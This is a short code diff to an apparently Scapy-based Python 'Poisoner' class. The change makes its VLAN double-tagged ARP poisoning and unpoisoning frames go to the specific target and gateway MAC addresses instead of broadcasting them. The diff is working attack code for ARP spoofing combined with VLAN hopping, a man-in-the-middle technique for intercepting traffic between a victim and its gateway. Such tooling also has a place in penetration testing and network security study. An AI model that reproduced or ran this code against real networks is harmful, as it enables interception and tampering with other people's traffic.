@@ -242,19 +242,19 @@ class Poisoner:
 		self.PKT_unpoison_2 = ARP(op=2, hwdst=gateway_mac, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=target_mac)
 
 			
-	def double_tag_poison_packets(self):
+	def double_tag_poison_packets(self, target_mac, gateway_mac):
 		"""Summary
 		"""
-		self.PKT_poison_1  = Ether(dst=BRDCAST_MAC)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_1
+		self.PKT_poison_1  = Ether(dst=target_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_1
 
-		self.PKT_poison_2 = Ether(dst=BRDCAST_MAC)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_2
+		self.PKT_poison_2 = Ether(dst=gateway_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_poison_2
 
-	def double_tag_unpoison_packets(self):
+	def double_tag_unpoison_packets(self, target_mac, gateway_mac):
 		"""Summary
 		"""
-		self.PKT_unpoison_1 = Ether(dst=BRDCAST_MAC)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_1
+		self.PKT_unpoison_1 = Ether(dst=target_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_1
 
-		self.PKT_unpoison_2 = Ether(dst=BRDCAST_MAC)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_2
+		self.PKT_unpoison_2 = Ether(dst=gateway_mac)/Dot1Q(vlan=int(self.vlan_num_1))/Dot1Q(vlan=int(self.vlan_num_2))/self.PKT_unpoison_2
 
 	def run(self):
 		"""Poisoning Mode 1, without VLAN double tagging
@@ -346,8 +346,8 @@ class Poisoner:
 		self._generate_poison_packets(target_mac, monitor_mac, gateway_mac)
 		self._generate_unpoison_packets(target_mac, monitor_mac, gateway_mac)
 
-		self.double_tag_poison_packets()
-		self.double_tag_unpoison_packets()
+		self.double_tag_poison_packets(target_mac, gateway_mac)
+		self.double_tag_unpoison_packets(target_mac, gateway_mac)
 
 
 		try:
